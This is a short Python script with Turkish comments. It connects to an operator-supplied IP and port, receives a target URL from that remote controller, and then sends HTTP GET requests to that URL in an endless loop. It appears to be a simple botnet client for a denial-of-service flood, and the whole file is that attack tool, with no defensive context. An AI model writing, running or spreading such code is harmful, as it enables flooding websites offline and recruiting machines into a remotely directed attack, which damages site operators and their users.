import socket
import requests

baglanilacakip= '' #ip giriniz buraya
baglanilacakport= '' #port giriniz buraya

soket= socket.socket()
soket.connect((baglanilacakip,baglanilacakport))
web= soket.recv(1024).decode()
while True:
 requests.get(url=web)
